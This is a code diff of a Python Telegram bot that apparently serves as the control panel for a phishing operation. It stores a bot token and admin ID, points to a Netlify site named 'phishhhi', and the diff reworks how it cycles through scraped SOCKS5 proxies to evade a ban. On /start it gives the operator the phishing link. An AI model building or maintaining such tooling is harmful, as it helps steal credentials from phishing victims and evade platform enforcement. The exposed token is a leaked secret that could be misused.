@@ -1,43 +1,43 @@
 import telebot
 from telebot import apihelper
 import requests
+import time
 
 # --- CONFIG ---
 TOKEN = '8085353942:AAH-r1yJqPGNvPruBICBW4aFAh2IPJjy_Qw'
 ADMIN_ID = '6671784926'
 NETLIFY_URL = "https://phishhhi.netlify.app"
 
-# --- AUTO PROXY FINDER ---
-def set_best_proxy():
-    print("Finding working proxy to bypass ban...")
+def get_proxy():
+    print("Scavenging proxies to bypass ban...")
     try:
-        # Fetching fresh SOCKS5 proxies
-        response = requests.get("https://api.proxyscrape.com")
-        proxies = response.text.split('\r\n')
-        for proxy in proxies:
-            if proxy:
-                try:
-                    apihelper.proxy = {'https': f'socks5://{proxy}'}
-                    bot.get_me() # Test connection
-                    print(f"✅ Connected via: {proxy}")
-                    return True
-                except:
-                    continue
-    except:
-        print("❌ Failed to fetch proxies. Check your internet.")
-    return False
+        r = requests.get("https://api.proxyscrape.com", timeout=10)
+        return r.text.split('\r\n')
+    except: return []
 
 bot = telebot.TeleBot(TOKEN)
 
 @bot.message_handler(commands=['start'])
-def welcome(message):
+def start_cmd(message):
     if str(message.chat.id) == ADMIN_ID:
-        msg = f"<b>🔥 v14.0 TITAN-SIPHON ACTIVE</b>\n\n🔗 Link: <code>{NETLIFY_URL}</code>"
+        msg = f"<b>🔥 v15.0 APEX-OVERLORD ACTIVE</b>\n\n🔗 Link: <code>{NETLIFY_URL}</code>\n🛡️ Status: <b>Online (Proxy)</b>"
         bot.send_message(message.chat.id, msg, parse_mode='HTML')
 
 if __name__ == "__main__":
-    if set_best_proxy():
-        print("Gold Connection Established.")
-        bot.polling()
+    proxies = get_proxy()
+    connected = False
+    for p in proxies:
+        if not p: continue
+        try:
+            apihelper.proxy = {'https': f'socks5://{p}'}
+            bot.get_me()
+            print(f"✅ Connection Gold: {p}")
+            connected = True
+            break
+        except: continue
+    
+    if connected:
+        bot.polling(none_stop=True)
     else:
-        print("Could not bypass ban. Try a manual VPN.")
+        print("❌ All proxies failed. Use a manual VPN in Termux.")
+
